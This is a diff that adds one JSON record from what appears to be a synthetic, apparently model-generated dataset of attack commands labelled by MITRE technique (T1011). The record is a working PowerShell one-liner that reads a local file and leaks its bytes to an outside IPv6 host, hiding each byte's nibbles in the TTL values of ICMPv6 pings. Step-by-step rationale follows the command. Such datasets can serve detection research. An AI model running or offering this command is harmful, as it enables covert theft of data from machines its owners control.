@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fd00:abba::1'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $d -Count 1 -TimeToLive (70 + $hi) -IPv6 -Quiet | Out-Null; Test-Connection -ComputerName $d -Count 1 -TimeToLive (100 + $lo) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Uses ICMPv6 TTL ranges to encode high/low nibbles of each byte, transmitting over ICMPv6 as an alternate medium aligned to T1011.",
+  "rationale_steps": [
+    "Split each byte into two 4-bit values.",
+    "Map nibbles into two distinct TTL ranges for clarity.",
+    "Send sequential ICMPv6 echos that a passive listener can reconstruct."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-3c199886",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
